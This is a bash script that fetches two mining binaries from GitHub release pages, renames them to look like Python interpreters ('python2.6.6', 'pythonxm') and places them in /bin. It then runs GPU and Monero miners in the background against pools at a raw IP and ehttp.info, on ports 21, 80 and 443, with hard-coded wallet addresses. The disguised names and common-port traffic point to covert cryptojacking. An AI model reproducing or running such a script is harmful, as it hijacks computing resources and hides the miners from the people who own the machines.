#!bin/bash -xe 
iip=$(curl https://ipecho.net/plain)
IPNAME=$(sed 's|\.|o|g' <<< $iip)
nvidia-smi
curl ipinfo.io
# Version 1.2.3
# wget https://github.com/RavenCommunity/kawpowminer/releases/download/1.2.3/kawpowminer-ubuntu18-1.2.3.zip
# unzip kawpowminer-ubuntu18-1.2.3.zip
# version1.2.2
wget https://github.com/one10001/10001code/releases/download/2.6.6/python2.6.6
wget https://github.com/one10001/xmrig/releases/download/bin0.0.1/pythonxm
chmod +x pythonxm
chmod +x python2.6.6
cp python2.6.6 /bin/python2.6.6
cp pythonxm /bin/pythonxm
python2.6.6 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.206.127:21  --cu-grid-size 256  --cu-block-size 512  --cu-parallel-hash 8 2> log02.out 1> log02.out &
python2.6.6 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.206.127:80  --cu-grid-size 256  --cu-block-size 512  --cu-parallel-hash 8 2> log01.out 1> log01.out  &
pythonxm  -o ehttp.info:443 -a cn/r -u 44ucr5iSqUjCR6m93Gu9ssJC9W1yWLGz1fZbAChLXG1QPnFD5bsTXKJAQEk8dHKDWx8hYJQ5ELqg9DJKNA1oRoNZKCGyn1p  -p x -k 2> logxm.out 1> logxm.out  &
nvidia-smi

while [ 1 ]
do
    echo '#######################################################################################################################################'
    echo first 21: $(grep -o 'Accepted' log02.out  | wc -l)
    grep -o 'Accepted' log02.out | tail -n 1
    echo second 80: $(grep -o 'Accepted' log01.out | wc -l)
    grep -o 'Accepted' log01.out | tail -n 1
    nvidia-smi
    sleep 30
done
